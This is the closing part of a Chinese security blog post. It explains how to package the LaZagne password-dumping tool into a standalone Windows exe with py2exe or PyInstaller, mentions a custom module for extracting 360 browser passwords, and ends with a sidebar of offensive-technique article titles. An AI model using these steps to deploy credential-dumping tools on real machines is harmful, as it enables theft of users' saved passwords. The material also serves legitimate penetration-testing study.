<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># mysetup.py
from distutils.core import setup
import py2exe
setup(console=["laZagne.py"])
</code></pre></div></div>

<p>保存在LaZagne-master\LaZagne-master\Windows\下，即laZagne.py的同级目录</p>

<p><strong>3、生成</strong></p>

<p>cmd执行：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Python27\python.exe mysetup.py py2exe</code></p>

<p><strong>4、测试</strong></p>

<p>执行laZagne.exe</p>

<p>提示<code class="language-plaintext highlighter-rouge">ImportError: No module named pyasn1</code></p>

<p><strong>解决方法：</strong></p>

<p>在C:\Python27\Lib\site-packages找到文件pyasn1-0.2.3-py2.7.egg</p>

<p>将其解压缩，在同级目录生成文件夹pyasn1</p>

<p>使用py2exe重新编译：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Python27\python.exe mysetup.py py2exe</code></p>

<p>生成dist文件夹，再次执行laZagne.exe，成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/2-1.png" alt="Alt text"></p>

<h2 id="0x05-使用pyinstaller将python脚本转成exe">0x05 使用PyInstaller将python脚本转成exe</h2>
<hr>

<p><strong>1、安装PyInstaller</strong></p>

<p><strong>方法1：</strong> 使用pip安装</p>

<p>安装pywin32，<strong>下载地址：</strong></p>

<p>https://sourceforge.net/projects/pywin32/files/pywin32/</p>

<p>使用pip安装：</p>

<p><code class="language-plaintext highlighter-rouge">pip install pyinstaller</code></p>

<p>报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/2-2.png" alt="Alt text"></p>

<p><strong>方法2：</strong> 下载源码安装</p>

<p><strong>源码下载地址：</strong></p>

<p>http://www.pyinstaller.org/downloads.html</p>

<p>测试使用的版本为<code class="language-plaintext highlighter-rouge">PyInstaller-3.2.1</code></p>

<p>解压缩后进入其子目录bootloader：</p>

<p><code class="language-plaintext highlighter-rouge">cd bootloader</code></p>

<p>编译：</p>

<p><code class="language-plaintext highlighter-rouge">python ./waf configure build install</code></p>

<p>重新进入根目录：</p>

<p><code class="language-plaintext highlighter-rouge">cd ..</code></p>

<p>安装pyinstaller：</p>

<p><code class="language-plaintext highlighter-rouge">python setup.py install</code></p>

<p>安装成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/2-3.png" alt="Alt text"></p>

<p><strong>2、打包exe</strong></p>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Python27\Scripts\pyinstaller-script.py -F C:\LaZagne-master\LaZagne-master\Windows\laZagne.py</code></p>

<p><strong>注：</strong></p>

<p>-F参数表示打包成单个exe</p>

<p>在C:\Python27\Scripts\下生成dist文件夹，里面包含生成的laZagne.exe</p>

<p>测试系统(未安装Python)执行laZagne.exe</p>

<p>成功运行，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/2-4.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了使用python编写LaZagne扩展脚本的方法，实现了导出360极速浏览器的用户密码。针对不同的软件，使用LaZagne定制脚本导出密码无疑是一个十分高效的方式。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July  9, 2017
  </div>

  
</article><article class="page">

  <h1>About</h1>

  <div class="entry">
    <p>Security Research</p>

<p>More to learn</p>

<h3 id="contact">Contact</h3>

<p>Drops:    三好学生</p>

<p>Twitter:  <a href="https://twitter.com/3gstudent">3gstudent</a></p>

<p>Github:   <a href="https://github.com/3gstudent">3gstudent</a></p>

<hr>

<h3 id="previous-posts-on-drops41">Previous Posts on Drops(41)</h3>

<ul>
  <li>A dirty way of tricking users to bypass UAC</li>
  <li>Bypass McAfee Application Control——Code Execution</li>
  <li>Bypass McAfee Application Control——Write&amp;Read Protection</li>
  <li>Bypass Windows AppLocker</li>
  <li>Code Execution of Regsvr32.exe</li>
  <li>CPL文件利用介绍</li>
  <li>JavaScript Backdoor</li>
  <li>JavaScript Phishing</li>
  <li>Memory Dump利用实例</li>
  <li>Mousejack测试指南</li>
  <li>Pay close attention to your download code——Visual Studio trick to run code when building</li>
  <li>Powershell tricks::Code Execution &amp; Process Injection</li>
  <li>Use bitsadmin to maintain persistence and bypass Autoruns</li>
  <li>Use Bots of Telegram as a C2 server</li>
  <li>Use SCT to Bypass Application Whitelisting Protection</li>
  <li>WinRAR(5.21)0day漏洞始末分析</li>
  <li>WMI Attacks</li>
  <li>WMI Backdoor</li>
  <li>WMI Defense</li>
  <li>WSC、JSRAT and WMI Backdoor</li>
  <li>导出当前域内所有用户hash的技术整理</li>
  <li>关于32位程序在64位系统下运行中需要注意的重定向问题</li>
  <li>基于WPAD的中间人攻击</li>
  <li>利用Powershell快速导出域控所有用户Hash</li>
  <li>利用白名单绕过360实例</li>
  <li>利用白名单绕过限制的更多测试</li>
  <li>浏览器利用框架BeEF测试</li>
  <li>内网渗透中的mimikatz</li>
  <li>渗透技巧——如何巧妙利用PSR监控Windows桌面</li>
  <li>渗透技巧——通过cmd上传文件的N种方法</li>
  <li>渗透技巧——Use AutoIt script to create a keylogger</li>
  <li>域渗透——Dump Clear-Text Password after KB2871997 installed</li>
  <li>域渗透——Hook PasswordChangeNotify</li>
  <li>域渗透——Local Administrator Password Solution</li>
  <li>域渗透——Pass The Hash &amp; Pass The Key</li>
  <li>域渗透——Pass The Ticket</li>
  <li>域渗透——Security Support Provider</li>
  <li>域渗透——Skeleton Key</li>
  <li>域渗透——EFS文件解密</li>
  <li>在远程系统上执行程序的技术整理</li>
  <li>中间人攻击利用框架bettercap测试</li>
</ul>

<hr>

<h3 id="recent-posts202207">Recent Posts(202/207)</h3>

<ul>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/An-interesting-way-of-bypassing-Windows-Attachment-Manager/">An interesting way of bypassing Windows Attachment Manager</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/AntiVirus-Evasion-Tool(avet)%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">AntiVirus Evasion Tool(avet)测试分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/AtomBombing%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">AtomBombing利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">Authenticode签名伪造——PE文件的签名伪造与签名验证劫持</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-%E9%92%88%E5%AF%B9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/">Authenticode签名伪造——针对文件类型的签名伪造</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/">Catalog签名伪造——Long UNC文件名欺骗</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">CAT文件数字签名使用技巧</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%BA%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/">CIA Hive测试指南——源代码获取与简要分析 </a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/">CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B02-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0https%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/">CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Vault7-RDB%E4%B8%AD%E7%9A%84Windows%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CIA Vault7 RDB中的Windows后门利用方法分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Cobalt_Strike%E7%9A%84blockdlls%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">Cobalt Strike的blockdlls利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Covenant%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">Covenant利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/CVE-2017-8360(Keylogger-in-HP-Audio-Driver)%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">CVE-2017-8360(Keylogger in HP Audio Driver)利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/">DLL劫持漏洞自动化识别工具Rattler测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">Empire中的Invoke-WScriptBypassUAC利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/">Exchange Web Service(EWS)开发指南</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/GadgetToJScript%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">GadgetToJScript利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/GookitBankingTrojan%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">GookitBankingTrojan中的后门利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">Hidden Alternative Data Streams的进阶利用技巧</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Joomla-3.4.4-3.6.3-Account-Creation-&amp;Privilege-Escalation%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/">Joomla 3.4.4-3.6.3 Account Creation &amp;Privilege Escalation测试记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Lateral-Movement-SCM-and-DLL-Hijacking-Primer-%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%A9%E5%B1%95/">《Lateral Movement — SCM and DLL Hijacking Primer》的利用扩展</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/">Linux下的密码Hash——加密方式与破解方法的技术整理</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/">《MiniDumpWriteDump via COM+ Services DLL》的利用测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/">Netsh persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95/">NSA DanderSpiritz测试指南——木马生成与测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Invoke-PowerThIEf%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">Invoke-PowerThIEf利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Invoke-PSImage%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">Invoke-PSImage利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADsekurlsa-wdigest%E7%9A%84%E5%AE%9E%E7%8E%B0/">Mimikatz中sekurlsa::wdigest的实现</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/">Office Persistence on x64 operating system</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">Password Filter DLL在渗透测试中的应用</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Phishing-credentials-via-Basic-Authentication(phishery)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/">Phishing credentials via Basic Authentication(phishery)利用测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Powershell-tricks-Hide-Process-by-kd.exe/">Powershell tricks::Hide Process by kd.exe</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Process-Doppelganging%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D/">Process Doppelganging利用介绍</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/ProcessHider%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">ProcessHider利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/SharpGen%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">SharpGen利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/SharpSniper%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">SharpSniper利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Shellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Donut%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">Shellcode生成工具Donut测试分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Shodan-API%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">Shodan API使用指南</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/SILENTTRINITY%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">SILENTTRINITY利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-dnx.exe-&amp;-rcsi.exe-to-bypass-Decvice-Guard-UMCI/">Study Notes of using dnx.exe / rcsi.exe to bypass Decvice Guard UMCI</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-sdclt.exe-to-bypass-UAC/">Study Notes of using sdclt.exe to bypass UAC</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/">Study Notes of WMI Persistence using wmic.exe</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-BGInfo-to-bypass-Application-Whitelisting/">Study Notes of using BGInfo to bypass Application Whitelisting</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-SilentCleanup-to-bypass-UAC/">Study Notes of using SilentCleanup to bypass UAC</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/">Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.2(Shellcode-Via-JScript-&amp;-VBScript)/">Study Notes Weekly No.2(Shellcode Via JScript &amp; VBScript)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.3(Use-odbcconf-to-load-dll-&amp;-Get-Exports-&amp;-ETW-USB-Keylogger)/">Study Notes Weekly No.3(Use odbcconf to load dll &amp; Get-Exports &amp; ETW USB Keylogger)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.4(Use-tracker-to-load-dll-&amp;-Use-csi-to-bypass-UMCI-&amp;-Execute-C-from-XSLT-file)/">Study Notes Weekly No.4(Use tracker to load dll &amp; Use csi to bypass UMCI &amp; Execute C# from XSLT file)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/TeamViewer-13.0.5058%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/">TeamViewer 13.0.5058中的权限漏洞测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/">Use CLR to bypass UAC</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Excel.Application-object's-RegisterXLL()-method-to-load-dll/">Use Excel.Application object’s RegisterXLL() method to load dll</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/">Use MSBuild To Do More</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">Use msxsl to bypass AppLocker</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-powershell-to-find-a-writable-windows-service/">Use powershell to find a writable windows service</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-xwizard.exe-to-load-dll/">Use xwizard.exe to load dll</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/">Use AppDomainManager to maintain persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">Use CLR to maintain persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/">Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/">Use COM Object hijacking to maintain persistence——Hijack explorer.exe</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-Outlook/">Use COM Object hijacking to maintain persistence——Hijack Outlook</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/">Use Logon Scripts to maintain persistence </a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/">Use msdtc to maintain persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">Use Office to maintain persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/">Use Waitfor.exe to maintain persistence</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/">Userland registry hijacking</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/War3%E5%9C%B0%E5%9B%BE-%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90%E4%BB%8B%E7%BB%8D/">War3地图“漏洞”分析介绍</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Webmin-=1.920-Unauthenticated_RCE(CVE-2019-15107)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/">Webmin&lt;=1.920-Unauthenticated_RCE(CVE-2019-15107)利用测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/">Windows Lnk远程代码执行漏洞(CVE-2017-8464)利用测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/">Windows Shellcode学习笔记——通过VisualStudio生成shellcode</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/">Windows Shellcode学习笔记——shellcode的提取与测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/">Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E5%AF%B9jmp-esp%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/">Windows Shellcode学习笔记——栈溢出中对jmp esp的利用与优化</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VirtualProtect%E7%BB%95%E8%BF%87DEP/">Windows Shellcode学习笔记——通过VirtualProtect绕过DEP</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%A9%E7%94%A8VirtualAlloc%E7%BB%95%E8%BF%87DEP/">Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B/">Windows XML Event Log (EVTX)单条日志清除（一）——删除思路与实例</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%89-%E9%80%9A%E8%BF%87%E8%A7%A3%E9%99%A4%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E5%9B%9B-%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%94-%E9%80%9A%E8%BF%87DuplicateHandle%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Event-Viewer-Log-(EVT)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B/">Windows Event Viewer Log (EVT)单条日志清除（一）——删除思路与实例</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Event-Viewer-Log-(EVT)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evt%E6%96%87%E4%BB%B6%E6%8C%87%E5%AE%9A%E6%97%B6%E9%97%B4%E6%AE%B5%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows Event Viewer Log (EVT)单条日志清除（二）——程序实现删除evt文件指定时间段的日志记录</a></p>
  </li>
  <li>
